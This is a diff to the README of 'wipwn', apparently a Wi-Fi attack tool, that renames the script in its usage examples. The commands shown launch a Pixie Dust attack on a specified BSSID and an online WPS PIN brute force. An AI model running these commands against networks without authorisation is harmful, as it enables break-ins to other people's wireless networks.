@@ -12,19 +12,19 @@ cd wipwn
 chmod +x main.py
 ```
 
-#### Help : `sudo python wipwn.py --help`
-#### Example : `sudo python wipwn.py -i wlan0 -K`
+#### Help : `sudo python main --help`
+#### Example : `sudo python main.py -i wlan0 -K`
 
 #### Note: 
 + **First turn off your Wifi.**
 + **Turn on Hotspot.**
 + **Turn on Location.**
 - Show avaliable networks and start Pixie Dust attack on a specified network.
-- `sudo python wipwn.py -i wlan0 -K`
+- `sudo python main.py -i wlan0 -K`
 - - Start Pixie Dust attack on a specified BSSID:
-`sudo python wipwn.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
+`sudo python main.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
 - Launch online WPS bruteforce with the specified first half of the PIN:
-- `sudo python wipwn.py -i wlan0 -b 50:0F:F5:B0:08:05 -B -p 1234`
+- `sudo python main.py -i wlan0 -b 50:0F:F5:B0:08:05 -B -p 1234`
 ### Troubleshooting
 **"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**
 
